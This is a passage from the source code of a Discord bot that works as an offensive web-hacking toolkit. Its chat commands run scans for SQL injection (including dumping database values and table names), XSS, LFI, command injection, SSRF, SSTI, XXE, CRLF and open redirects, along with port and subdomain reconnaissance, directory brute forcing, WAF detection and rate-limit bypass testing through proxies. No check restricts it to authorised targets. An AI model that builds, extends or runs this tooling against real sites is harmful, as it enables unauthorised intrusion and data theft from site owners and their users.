    out = "\n".join(f"[{t}] {n} :: {d}" for t, n, d in hits)
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="sqli_dump")
async def sqli_dump_cmd(ctx, url: str, param: str):
    m = await ctx.send(f"finding columns {url}")
    cols, data = await sqli_dump_basic(url, param)
    await m.edit(content=f"columns={cols}")
    if cols < 1:
        return
    out = f"cols={cols}\n"
    for name, arr in data.items():
        for pos, val in arr:
            out += f"{name}[{pos}]: {val}\n"
            save_finding(f"sqli_{name}", url, param, name, val)
    for c in chunk_output(out):
        await ctx.send(f"```{c}```")


@bot.command(name="sqli_tables")
async def sqli_tables_cmd(ctx, url: str, param: str, dbtype: str = "mysql"):
    m = await ctx.send(f"dump tables {dbtype}")
    cols = await sqli_union_columns(url, param)
    if cols < 1:
        return await m.edit(content="cannot find columns")
    t = await sqli_dump_tables(url, param, cols, dbtype)
    out = ""
    for pos, val in t:
        out += f"tables[{pos}]: {val}\n"
        save_finding("sqli_tables", url, param, dbtype, val)
    await m.edit(content=f"```{out[:1900]}```")


@bot.command(name="sqli_post")
async def sqli_post_cmd(ctx, url: str, data_str: str):
    data = dict(p.split("=", 1) for p in data_str.split("&") if "=" in p)
    m = await ctx.send(f"post sqli {url}")
    hits = await sqli_post(url, data)
    if not hits:
        return await m.edit(content="no post sqli")
    out = "\n".join(f"[{t}] {k}={p} :: {e}" for t, k, p, e in hits[:50])
    for h in hits:
        save_finding("sqli_post", url, h[1], h[2], h[3])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


# ---- XSS / LFI / CMDI / Redir / SSRF / SSTI / CRLF / XXE ----

@bot.command(name="xss")
async def xss(ctx, url: str, param: str = None):
    m = await ctx.send(f"xss scan {url}")
    hits = await xss_scan(url, param)
    for h in hits:
        save_finding("xss", url, param or "", h[1], "")
    if not hits:
        return await m.edit(content="no xss")
    out = "\n".join(f"[{t}] {p}" for t, p in hits[:50])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="lfi")
async def lfi(ctx, url: str, param: str):
    m = await ctx.send(f"lfi scan {url}")
    hits = await lfi_scan(url, param)
    for h in hits:
        save_finding("lfi", url, param, h[1], "")
    if not hits:
        return await m.edit(content="no lfi")
    out = "\n".join(f"[{t}] {p}" for t, p in hits[:50])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="cmdi")
async def cmdi(ctx, url: str, param: str):
    m = await ctx.send(f"cmdi scan {url}")
    hits = await cmdi_scan(url, param)
    for h in hits:
        save_finding("cmdi", url, param, h[1], h[2] if len(h) > 2 else "")
    if not hits:
        return await m.edit(content="no cmdi")
    out = "\n".join(f"[{t}] {p}" for t, p in hits[:50])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="redir")
async def redir(ctx, url: str, param: str):
    m = await ctx.send(f"open redirect {url}")
    hits = await openredir_scan(url, param)
    for h in hits:
        save_finding("redir", url, param, h[1], h[2])
    if not hits:
        return await m.edit(content="no open redirect")
    out = "\n".join(f"[{t}] {p} -> {loc}" for t, p, loc in hits[:50])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="ssrf")
async def ssrf(ctx, url: str, param: str):
    m = await ctx.send(f"ssrf scan {url}")
    hits = await ssrf_scan(url, param)
    for h in hits:
        save_finding("ssrf", url, param, h[1], h[2] if len(h) > 2 else "")
    if not hits:
        return await m.edit(content="no ssrf")
    out = "\n".join(" ".join(map(str, h)) for h in hits[:50])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="ssti")
async def ssti(ctx, url: str, param: str):
    m = await ctx.send(f"ssti scan {url}")
    hits = await ssti_test(url, param)
    for h in hits:
        save_finding("ssti", url, param, h[1], h[2])
    if not hits:
        return await m.edit(content="no ssti")
    out = "\n".join(f"[{t}] {p} == {e}" for t, p, e in hits)
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="crlf")
async def crlf(ctx, url: str, param: str):
    m = await ctx.send(f"crlf scan {url}")
    hits = await crlf_test(url, param)
    if not hits:
        return await m.edit(content="no crlf")
    out = "\n".join(f"[{t}] {p}" for t, p in hits)
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="xxe")
async def xxe(ctx, url: str, param: str):
    m = await ctx.send(f"xxe scan {url}")
    hits = await xxe_test(url, param)
    if not hits:
        return await m.edit(content="no xxe")
    out = "\n".join(f"[{t}]" for t, _ in hits)
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


# ---- recon ----

@bot.command(name="admin")
async def admin(ctx, base: str):
    m = await ctx.send(f"admin finder {base}")
    hits = await admin_finder(base)
    if not hits:
        return await m.edit(content="no admin path")
    out = "\n".join(f"{u} [{s}] {n}b" for u, s, n in hits[:60])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="sensitive")
async def sensitive(ctx, base: str):
    m = await ctx.send(f"sensitive files {base}")
    hits = await sensitive_files(base)
    if not hits:
        return await m.edit(content="no leak")
    out = "\n".join(f"[{t}] {u} ({n}b)" for u, _, t, n in hits[:60])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="ports")
async def ports(ctx, host: str):
    m = await ctx.send(f"port scan {host}")
    hits = await port_scan(host)
    await m.edit(content=f"open ports: {hits}")


@bot.command(name="waf")
async def waf(ctx, url: str):
    m = await ctx.send(f"waf detect {url}")
    found, st = await waf_detect(url)
    await m.edit(content=f"status={st}\nwaf: {', '.join(found) if found else 'none'}")


@bot.command(name="subdomains")
async def subdomains(ctx, domain: str):
    m = await ctx.send(f"enum subdomains {domain}")
    hits = await subdomain_enum(domain)
    if not hits:
        return await m.edit(content="no subdomain")
    out = "\n".join(sorted(hits))
    await m.edit(content=f"found={len(hits)}\n```{out[:1900]}```")


@bot.command(name="hdr")
async def hdr(ctx, url: str, name: str, value: str):
    m = await ctx.send(f"header inject {name}={value}")
    st, hd, bd = await header_inject(url, name, value)
    out = f"status={st}\n"
    for k, v in list(hd.items())[:30]:
        out += f"{k}: {v}\n"
    await m.edit(content=f"```{out[:1900]}```")


@bot.command(name="robots")
async def robots(ctx, base: str):
    m = await ctx.send(f"robots/sitemap {base}")
    hits = await robots_scan(base)
    if not hits:
        return await m.edit(content="none found")
    out = ""
    for path, txt in hits:
        out += f"=== {path} ===\n{txt[:400]}\n\n"
    for c in chunk_output(out):
        await ctx.send(f"```{c}```")
    await m.delete()


@bot.command(name="dirb")
async def dirb_cmd(ctx, base: str):
    m = await ctx.send(f"dir brute {base}")
    hits = await dirb(base)
    if not hits:
        return await m.edit(content="no directory")
    out = "\n".join(f"{u} [{s}] {n}b" for u, s, n in hits[:60])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="methods_http")
async def methods_http(ctx, url: str):
    m = await ctx.send(f"http methods {url}")
    hits = await http_methods(url)
    out = "\n".join(f"{mm} -> {st}" for mm, st in hits)
    await m.edit(content=f"```{out}```")


@bot.command(name="clickjacking")
async def clickjacking(ctx, url: str):
    m = await ctx.send(f"clickjacking {url}")
    vuln, xfo, csp = await clickjacking_test(url)
    await m.edit(content=f"vulnerable={vuln}\nX-Frame-Options={xfo or '-'}\nCSP={csp or '-'}")


@bot.command(name="cors")
async def cors(ctx, url: str):
    m = await ctx.send(f"cors {url}")
    acao, acac, bad = await cors_test(url)
    await m.edit(content=f"vulnerable={bad}\nACAO={acao or '-'}\nACAC={acac or '-'}")


@bot.command(name="csp")
async def csp(ctx, url: str):
    m = await ctx.send(f"csp {url}")
    policy, issues = await csp_test(url)
    await m.edit(content=f"issues={issues}\nCSP={policy or '-'}")


# ---- rate-limit / proxy ----

@bot.command(name="rl_test")
async def rl_test_cmd(ctx, url: str, n: int = 30):
    m = await ctx.send(f"rate limit bypass test {n} req")
    ok, total = await rl_bypass_test(url, n)
    await m.edit(content=f"passed {ok}/{total} -> bypass={'yes' if ok > total * 0.8 else 'no'}")


@bot.command(name="proxies")
async def proxies_cmd(ctx):
    p = proxies()
    await ctx.send(f"proxy.txt count={len(p)}")


# ---- aggregate / report ----

@bot.command(name="all")
async def all_cmd(ctx, url: str, param: str):
    m = await ctx.send(f"full scan {url} param={param}")
    res = await full_scan(url, param)
    out = ""
    for k, v in res.items():
        out += f"{k}: {len(v)}\n"
        for item in v[:5]:
            out += f"  {item}\n"
    for c in chunk_output(out):
        await ctx.send(f"```{c}```")
    await m.delete()


@bot.command(name="report")
async def report_cmd(ctx, target: str):
    path = export_html(target)
    if not path:
        return await ctx.send("no findings for target")
    items = load_findings(target)
    await ctx.send(content=f"findings={len(items)}", file=discord.File(path))


@bot.command(name="findings")
async def findings_cmd(ctx, target: str):
    items = load_findings(target)
    if not items:
        return await ctx.send("none")
    out = "\n".join(f"{i['kind']} :: {i['param']} :: {i['payload'][:60]}" for i in items[-40:])
    for c in chunk_output(out):
        await ctx.send(f"```{c}```")


@bot.command(name="toolkit")
async def toolkit(ctx):
    await ctx.send(
        "**injection**\n"
        "`/sqli <url> [param]`\n"
        "`/sqli_blind <url> <param>`\n"
        "`/sqli_time <url> <param>`\n"
        "`/sqli_dump <url> <param>` — version/user/db/hostname\n"
        "`/sqli_tables <url> <param> [dbtype]`\n"
        "`/sqli_post <url> <k1=v1&k2=v2>`\n"
        "`/xss <url> [param]`\n"
        "`/lfi <url> <param>`\n"
        "`/cmdi <url> <param>`\n"
        "`/ssti <url> <param>`\n"
        "`/crlf <url> <param>`\n"
        "`/xxe <url> <param>`\n"
        "`/redir <url> <param>`\n"
        "`/ssrf <url> <param>`\n"
        "**recon**\n"
        "`/admin <base>`\n"
        "`/sensitive <base>`\n"
        "`/ports <host>`\n"
        "`/waf <url>`\n"
        "`/subdomains <domain>`\n"
        "`/robots <base>`\n"
        "`/dirb <base>`\n"
        "`/hdr <url> <name> <value>`\n"
        "`/methods_http <url>`\n"
        "**misconfig**\n"
        "`/clickjacking <url>`\n"
        "`/cors <url>`\n"
        "`/csp <url>`\n"
        "**util**\n"
        "`/rl_test <url> [n]`\n"
        "`/proxies`\n"
        "**aggregate**\n"
        "`/all <url> <param>` — 10 scanner song song\n"
        "`/report <target>` — HTML\n"
        "`/findings <target>` — list"
    )


# ============== ENTRY ==============

def main():
    if not TOKEN or TOKEN == "PASTE_YOUR_VALID_TOKEN_HERE":
        print("edit TOKEN in this file first")
        sys.exit(1)
    if "." not in TOKEN or len(TOKEN) < 50:
        print("invalid token format")
        sys.exit(1)
    try:
        TOKEN.encode("ascii")
    except UnicodeEncodeError:
        print("token contains non-ascii characters — copy again from Developer Portal")
        sys.exit(1)
    bot.run(TOKEN)


if __name__ == "__main__":
    main()